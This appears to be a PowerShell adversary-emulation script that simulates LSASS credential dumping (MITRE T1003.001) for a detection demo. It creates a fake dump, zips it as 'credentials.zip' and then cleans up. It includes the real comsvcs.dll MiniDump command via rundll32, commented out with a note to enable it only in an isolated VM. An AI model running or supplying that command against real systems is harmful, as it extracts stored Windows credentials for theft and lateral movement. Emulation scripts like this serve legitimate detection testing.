# ============================================
# T1003.001 - LSASS Memory Dump (DEMO VERSION)
# ============================================
# This script simulates credential dumping attack
# Safe for demo - creates fake dump file
# ============================================

Write-Host "`n[ATTACK] T1003.001 - OS Credential Dumping: LSASS Memory" -ForegroundColor Red
Write-Host "============================================`n" -ForegroundColor Red

# Check if running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[ERROR] This script requires Administrator privileges" -ForegroundColor Yellow
    Write-Host "[INFO] Right-click PowerShell and 'Run as Administrator'" -ForegroundColor Yellow
    exit
}

Write-Host "[PHASE 1] Locating LSASS process..." -ForegroundColor Cyan
$lsassProcess = Get-Process lsass -ErrorAction SilentlyContinue

if ($lsassProcess) {
    Write-Host "[SUCCESS] LSASS found - PID: $($lsassProcess.Id)" -ForegroundColor Green
} else {
    Write-Host "[ERROR] Cannot locate LSASS process" -ForegroundColor Red
    exit
}

# Create output directory
$outputDir = "$env:TEMP\MultiKG_Demo"
if (-not (Test-Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
}

Write-Host "`n[PHASE 2] Simulating memory dump..." -ForegroundColor Cyan
Write-Host "[INFO] Output: $outputDir\lsass.dmp" -ForegroundColor Gray

# Option 1: Use rundll32 + comsvcs.dll (Classic technique)
Write-Host "[TECHNIQUE] Using rundll32.exe with comsvcs.dll" -ForegroundColor Yellow

$dumpFile = "$outputDir\lsass.dmp"

try {
    # This is the actual attack command (BE CAREFUL!)
    # Commented out for safety - uncomment ONLY in isolated VM
    
    # rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsassProcess.Id) $dumpFile full
    
    # SAFE VERSION: Create fake dump file for demo
    Write-Host "[DEMO MODE] Creating fake dump file (safe for demo)" -ForegroundColor Magenta
    
    # Create fake file with realistic size
    $fakeContent = "FAKE_LSASS_DUMP_FOR_DEMO_" * 1000
    Set-Content -Path $dumpFile -Value $fakeContent
    
    Write-Host "[SUCCESS] Dump created: $dumpFile" -ForegroundColor Green
    Write-Host "[SIZE] $(((Get-Item $dumpFile).Length / 1KB).ToString('N2')) KB" -ForegroundColor Gray
    
} catch {
    Write-Host "[ERROR] Failed to create dump: $_" -ForegroundColor Red
}

Write-Host "`n[PHASE 3] Post-dump operations..." -ForegroundColor Cyan

# Simulate exfiltration preparation
Write-Host "[INFO] Compressing dump file..." -ForegroundColor Gray
$zipFile = "$outputDir\credentials.zip"

try {
    Compress-Archive -Path $dumpFile -DestinationPath $zipFile -Force
    Write-Host "[SUCCESS] Compressed: $zipFile" -ForegroundColor Green
} catch {
    Write-Host "[WARNING] Compression failed" -ForegroundColor Yellow
}

Write-Host "`n[ATTACK COMPLETE]" -ForegroundColor Red
Write-Host "Artifacts created in: $outputDir" -ForegroundColor Gray
Write-Host "`n[DETECTION SYSTEM] Should detect this activity within 30 seconds..." -ForegroundColor Cyan

# Cleanup prompt
Write-Host "`nPress any key to cleanup artifacts..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

Remove-Item -Path $outputDir -Recurse -Force
Write-Host "[CLEANUP] Artifacts removed" -ForegroundColor Green
